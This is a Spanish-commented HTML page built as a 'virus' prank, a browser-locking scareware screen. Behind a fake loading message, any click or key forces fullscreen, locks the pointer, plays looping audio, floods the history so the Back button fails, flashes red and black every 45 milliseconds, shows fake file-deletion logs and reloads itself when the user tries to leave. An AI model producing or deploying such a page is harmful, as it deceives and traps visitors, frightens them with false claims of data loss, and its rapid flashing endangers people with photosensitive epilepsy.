<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>⚡ SYSTEM FAILURE ⚡</title>
    <style>
        * { box-sizing: border-box; cursor: none !important; }
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            background-color: #000; color: #f00; 
            font-family: 'Courier New', monospace; 
            overflow: hidden; touch-action: none;
        }

        /* Pantalla de "Carga" invisible que cubre todo */
        #trigger-layer {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 999999; display: flex; align-items: center; justify-content: center;
            background: #000; cursor: pointer;
        }

        .loading-text { font-size: 1.2rem; color: #333; animation: pulse 2s infinite; }

        /* Capa Killbot */
        #kiosk-mode {
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
            background-color: #000; display: none; z-index: 100;
        }

        .glitch-text {
            position: absolute; font-size: 15vw; font-weight: 900;
            color: white; text-shadow: 5px 5px #f00; pointer-events: none;
            animation: shake 0.05s infinite; text-transform: uppercase;
        }

        #log { position: absolute; bottom: 0; left: 0; font-size: 10px; color: #0f0; padding: 10px; opacity: 0.6; }

        @keyframes shake {
            0% { transform: translate(5px, 3px); filter: hue-rotate(90deg); }
            50% { transform: translate(-5px, -3px); filter: hue-rotate(0deg); }
            100% { transform: translate(0, 0); }
        }

        @keyframes pulse { 0% { opacity: 0.2; } 50% { opacity: 0.5; } 100% { opacity: 0.2; } }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="trigger-layer">
        <div class="loading-text">Cargando componentes del sistema...</div>
    </div>

    <div id="kiosk-mode">
        <div id="log"></div>
    </div>

    <audio id="killbot-audio" loop>
        <source src="https://cdn.discordapp.com/attachments/1375609945017290836/1470865995227857067/killbot.mp3?ex=698cda34&is=698b88b4&hm=69b6785fada5757221116c6e5b9f379146692506138fc6c4f3a7ae2a4ae7ece8&" type="audio/mpeg">
    </audio>

    <script>
        const trigger = document.getElementById('trigger-layer');
        const kiosk = document.getElementById('kiosk-mode');
        const audio = document.getElementById('killbot-audio');
        const log = document.getElementById('log');
        let virusActive = false;

        // Función que activa el modo Kiosko Inescapable
        function startVirus() {
            virusActive = true;
            trigger.style.display = 'none';
            kiosk.style.display = 'block';

            // 1. Forzar Pantalla Completa
            const el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();

            // 2. Bloquear puntero (PC)
            if (document.body.requestPointerLock) document.body.requestPointerLock();

            // 3. Iniciar audio
            audio.play();

            // 4. Llenar historial para bloquear botón "Atrás" (Android)
            for(let i=0; i<100; i++) {
                history.pushState({hack: true}, "", "#system_corrupted_" + i);
            }

            // 5. Iniciar Caos Visual
            runVisualChaos();
        }

        // Cualquier interacción activa el virus
        window.addEventListener('mousedown', () => { if(!virusActive) startVirus(); });
        window.addEventListener('touchstart', () => { if(!virusActive) startVirus(); });
        window.addEventListener('keydown', () => { if(!virusActive) startVirus(); });

        function runVisualChaos() {
            setInterval(() => {
                // Generar textos aleatorios
                const t = document.createElement('div');
                t.className = 'glitch-text';
                const words = ["KILLBOT", "DIEDIEDIE", "ERROR", "CRITICAL", "NO ESCAPE", "VOID"];
                t.innerText = words[Math.floor(Math.random() * words.length)];
                t.style.left = Math.random() * 80 + "vw";
                t.style.top = Math.random() * 80 + "vh";
                kiosk.appendChild(t);
                setTimeout(() => t.remove(), 200);

                // Flash agresivo
                kiosk.style.backgroundColor = (Math.random() > 0.5) ? "#f00" : "#000";
                
                // Log de terminal
                const l = document.createElement('div');
                l.innerText = `[FATAL] DELETING_BLOCK_${Math.random().toString(16).toUpperCase().slice(2,10)}`;
                log.appendChild(l);
                if(log.childNodes.length > 30) log.removeChild(log.firstChild);
            }, 45);
        }

        // Re-activar fullscreen si el usuario intenta salir
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement && virusActive) {
                // Al primer toque después de intentar salir, vuelve a pantalla completa
                kiosk.innerHTML += '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,0,0,0.5);z-index:999999;display:flex;align-items:center;justify-content:center;font-size:2rem;color:white;">ERROR: ACCESO DENEGADO</div>';
                setTimeout(() => location.reload(), 1000); // Si intenta salir, reiniciamos el bucle
            }
        });

        // Bloqueo total de salida
        window.onbeforeunload = () => "DO NOT LEAVE";
    </script>
</body>
</html>
